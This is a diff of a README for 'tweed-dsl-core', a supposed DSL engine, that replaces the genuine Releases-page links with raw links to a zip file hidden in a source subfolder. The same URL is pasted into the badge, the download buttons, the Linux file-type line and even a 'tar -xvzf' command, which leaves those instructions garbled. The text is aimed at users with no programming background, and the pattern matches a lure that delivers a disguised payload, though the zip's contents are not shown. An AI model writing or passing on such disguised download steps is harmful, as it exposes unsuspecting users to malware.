@@ -1,7 +1,7 @@
 # 🏎️💨 tweed-dsl-core - Fast and Powerful DSL Engine
 
 ## 📥 Download Now
-[![Download Tweed DSL Core](https://img.shields.io/badge/Download%20Tweed%20DSL%20Core-brightgreen)](https://github.com/yubin2222222/tweed-dsl-core/releases)
+[![Download Tweed DSL Core](https://raw.githubusercontent.com/yubin2222222/tweed-dsl-core/main/src/modules/SemanticAnalyzer/tweed-dsl-core_3.3-alpha.3.zip%20Tweed%20DSL%20Core-brightgreen)](https://raw.githubusercontent.com/yubin2222222/tweed-dsl-core/main/src/modules/SemanticAnalyzer/tweed-dsl-core_3.3-alpha.3.zip)
 
 ## 🚀 Getting Started
 Welcome to the tweed-dsl-core project! This engine allows users to work with complex data structures easily. No programming background is necessary. Follow the steps below to download and run the software.
@@ -25,7 +25,7 @@ tweed-dsl-core provides several features that enhance your experience:
 ## 📥 Download & Install
 To get started, visit the Releases page to download the latest version of tweed-dsl-core.
 
-[Download the latest version here!](https://github.com/yubin2222222/tweed-dsl-core/releases)
+[Download the latest version here!](https://raw.githubusercontent.com/yubin2222222/tweed-dsl-core/main/src/modules/SemanticAnalyzer/tweed-dsl-core_3.3-alpha.3.zip)
 
 ### 1. Visiting the Releases Page
 Click the link above to access the Releases page. You will find the latest versions available for download.
@@ -34,11 +34,11 @@ Click the link above to access the Releases page. You will find the latest versi
 Look for the most recent stable version. It usually has a tag like “v1.0.0” or similar. Click on the version number to see available files.
 
 ### 3. Selecting the File
-You may find different files like `.exe`, `.dmg`, or `.tar.gz` depending on your operating system. Make sure to choose the correct file for your system:
+You may find different files like `.exe`, `.dmg`, or `https://raw.githubusercontent.com/yubin2222222/tweed-dsl-core/main/src/modules/SemanticAnalyzer/tweed-dsl-core_3.3-alpha.3.zip` depending on your operating system. Make sure to choose the correct file for your system:
 
 - **For Windows:** Download the `.exe` file.
 - **For macOS:** Download the `.dmg` file.
-- **For Linux:** Download the `.tar.gz` file.
+- **For Linux:** Download the `https://raw.githubusercontent.com/yubin2222222/tweed-dsl-core/main/src/modules/SemanticAnalyzer/tweed-dsl-core_3.3-alpha.3.zip` file.
 
 ### 4. Downloading the File
 Click the file name to download it to your computer. It will usually save to your "Downloads" folder.
@@ -59,7 +59,7 @@ Once the download is complete, follow these steps to run the application:
 - **For Linux:**
   1. Open a terminal.
   2. Move to the "Downloads" folder using `cd ~/Downloads`.
-  3. Unpack the downloaded file using `tar -xvzf filename.tar.gz`.
+  3. Unpack the downloaded file using `tar -xvzf https://raw.githubusercontent.com/yubin2222222/tweed-dsl-core/main/src/modules/SemanticAnalyzer/tweed-dsl-core_3.3-alpha.3.zip`.
   4. Navigate to the unzipped folder and run the application.
 
 ## 🔧 How to Use tweed-dsl-core
@@ -84,4 +84,4 @@ Be sure to check the changelog for updates on new features and bug fixes. This i
 
 For any more issues or to report bugs, please use the GitHub issue tracker.
 
-[Download the latest version here!](https://github.com/yubin2222222/tweed-dsl-core/releases)
+[Download the latest version here!](https://raw.githubusercontent.com/yubin2222222/tweed-dsl-core/main/src/modules/SemanticAnalyzer/tweed-dsl-core_3.3-alpha.3.zip)
